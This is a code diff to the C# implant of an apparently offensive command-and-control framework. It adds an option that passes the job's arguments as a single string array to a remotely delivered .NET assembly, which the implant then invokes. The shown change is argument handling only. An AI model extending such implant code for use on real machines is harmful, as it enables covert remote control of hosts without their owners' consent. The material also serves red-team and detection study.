@@ -404,36 +404,47 @@ namespace NuagesSharpImplant
             int length = (int)job["payload"]["options"]["length"];
             string file_id = job["payload"]["options"]["file_id"];
             bool cache = job["payload"]["options"]["cache"];
+	    bool arg_as_string_array = job["payload"]["options"]["arg_as_string_array"];
             Assembly assembly;
             string result = "";
             Object[] argarr;
             Type[] typearr;
-            if (arguments == "")
-            {
-                typearr = new Type[0];
-                argarr = new Object[0];
-            }
-            else
-            {
-                string[] strarr = arguments.Split(',');
-                typearr = new Type[strarr.Length];
-                argarr = new Object[strarr.Length];
-                for (int i = 0; i < strarr.Length; i++)
-                {
-                    if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
-                    {
-                        argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
-                    }
-                    else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
-                    {
-                        argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
-                    }
-                    else
-                    {
-                        argarr[i] = strarr[i];
-                    }
-                    typearr[i] = argarr[i].GetType();
-                }
+	    if (arg_as_string_array)
+	    {
+    		typearr = new Type[1];
+   		argarr = new Object[1];
+    		argarr[0] = arguments.Split(' ');
+    		typearr[0] = argarr[0].GetType();
+	    }
+ 	    else
+	    {
+            	if (arguments == "")
+            	{
+                	typearr = new Type[0];
+                	argarr = new Object[0];
+            	}
+            	else
+            	{
+                	string[] strarr = arguments.Split(',');
+                	typearr = new Type[strarr.Length];
+                	argarr = new Object[strarr.Length];
+                	for (int i = 0; i < strarr.Length; i++)
+                	{
+                	    if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
+                 	   {
+                 	        argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
+                    	   }
+                    	   else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
+                    	   {
+                      		argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
+                    	   }
+                    	   else
+                    	   {
+                        	argarr[i] = strarr[i];
+                    	   }
+                    	   typearr[i] = argarr[i].GetType();
+                	}
+		}
             }
             if (this.assemblies.ContainsKey(file_id) && cache)
             {
